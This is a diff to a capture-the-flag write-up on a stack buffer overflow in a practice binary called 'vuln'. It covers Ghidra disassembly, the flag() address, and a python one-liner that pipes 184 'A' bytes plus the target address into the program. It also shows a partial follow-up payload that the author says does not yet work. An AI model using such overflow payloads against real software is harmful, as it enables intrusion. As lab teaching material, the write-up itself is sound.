@@ -19,7 +19,7 @@ Ok let hack it!
 
 ## Disassemble it
 
-Use Ghidra to disassmble the binary:
+Use Ghidra to disassemble the binary:
 
 - main():
 
@@ -123,6 +123,7 @@ Non-debugging symbols:
 
 flag() address = 0x080491e2
 
+[![Watch the video](docs/flag_address.png)](docs/flag_address.mp4)
 
 ## Stack overflow attack
 http://unixwiz.net/techtips/win32-callconv-asm.html
@@ -139,6 +140,10 @@ stack                                           stack
 
 We should write 184 dummy bytes then 0x080491e2 to the `local_bc`
 
+Build up our attack script: 
+```s
+python3 -c "print('A'*184 + '\xe2\x91\x04\x08')" | ./vuln
+```
 
 flag(int param_1, int param_2):
 ```s
@@ -151,9 +156,6 @@ stack                                                                           
 ```
 
 
-```s
-python3 -c "print('A'*184 + '\xe2\x91\x04\x08')" | ./vuln
-```
 
 Look like it's not correct!.
 
@@ -187,7 +189,7 @@ $(python3 -c "print('A'*184, end='')")\
 '\x0d\xd0\xde\xc0' | ./vuln
 ```
 
-Look likt it does not work.
+Look like it does not work.
 I need to do some searches and find out that we can observe the stack crash via `dmesg` on the local target file.
 So somehow it takes extra 4 bytes
 
